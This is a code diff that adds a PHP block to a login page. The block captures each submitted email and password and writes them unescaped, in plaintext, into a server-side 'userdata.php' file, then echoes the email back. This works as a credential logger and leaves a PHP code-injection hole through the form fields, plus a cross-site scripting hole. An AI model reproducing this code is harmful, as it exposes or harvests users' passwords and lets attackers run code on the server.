@@ -222,6 +222,21 @@ a:hover{
     </div>
   </footer>
   <script src="login.js"></script>
+<?php
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $email = $_POST["email"];
+    $password = $_POST["password"];
+
+    // Save to a PHP file
+    $data = "<?php\n\$email = '$email';\n\$password = '$password';\n?>";
+    file_put_contents("userdata.php", $data);
+
+    echo "✅ Login data saved successfully!<br>";
+    echo "Email: $email";
+} else {
+    echo "❌ No form data submitted.";
+}
+?>
 
 </body>
 </html>
